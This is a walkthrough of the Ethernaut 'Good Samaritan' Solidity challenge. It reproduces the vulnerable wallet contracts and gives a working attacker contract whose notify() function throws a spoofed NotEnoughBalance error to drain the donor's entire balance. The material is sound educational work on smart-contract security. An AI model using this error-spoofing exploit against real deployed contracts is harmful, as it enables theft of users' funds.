<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel27.svg" />

# Target Contract Review

Given conract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

Challenge's message.

> This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it. Would you be able to drain all the balance from his Wallet? Things that might help: Solidity Custom Errors

## Comparing Strings in Solidity
Solidity doesn't have native string comparison, so if we try to use common operators we'll ran into some issues. If you try to compare strings using common operators like `==` or `!=` you'll get an error message similar to these:

> operator != not compatible with type string storage

This is because Solidity does not support those operators in string variables.

Instead of using common operators `==` or `!=`, we can compare string values by comparing the strings **keccak256 hashes** to see if they match. However, we can't directly pass strings to keccak256. In the target contract, there is no direct comparison of string values or revert reasons. For example, when catching a revert reason:

```solidity
catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
```
Here, the revert `err` is compared against the expected error signature by hashing both values and checking for equality. Similarly, when comparing two strings, the correct approach is to hash their encoded byte representations using `abi.encodePacked()`.

```solidity
function comparing(string memory _message) public {
  // Compare string keccak256 hashes to check equality
  if (keccak256(abi.encodePacked('hello')) == keccak256(abi.encodePacked(_message))) {}
}
```
This pattern ensures reliable string comparison by converting strings into a deterministic byte format before hashing, which is the standard and recommended approach in Solidity.

# Subverting

When we look closer to `Coin` contract, there is `transfer()` function which takes two arguments: `amount` and `dest_`. If `dest_` is a contract, it will run the `notify()` function on the `_dest` contract.

```solidity
function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];
        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;
            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}
```
Therefore, we added an external `notify(uint256 amount)` function which will revert `NotEnoughBalance()` error in our attacker contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan{
    function requestDonation() external;
}

contract Attack{

    IGoodSamaritan target;
    error NotEnoughBalance();

    constructor(address _target) {
        target = IGoodSamaritan(_target);
    }

    function attack() external{
        target.requestDonation();
    }

    function notify(uint256 amount) external{
        if(amount <= 10){
            revert NotEnoughBalance();
        }
    }

}
```
Challenge's message:

> Congratulations! Custom errors in Solidity are identified by their 4-byte ‘selector’, the same as a function call. They are bubbled up through the call chain until they are caught by a catch statement in a try-catch block, as seen in the GoodSamaritan's requestDonation() function. For these reasons, it is not safe to assume that the error was thrown by the immediate target of the contract call (i.e., Wallet in this case). Any other contract further down in the call chain can declare the same error and throw it at an unexpected location, such as in the notify(uint256 amount) function in your attacker contract.

***by wasny0ps***
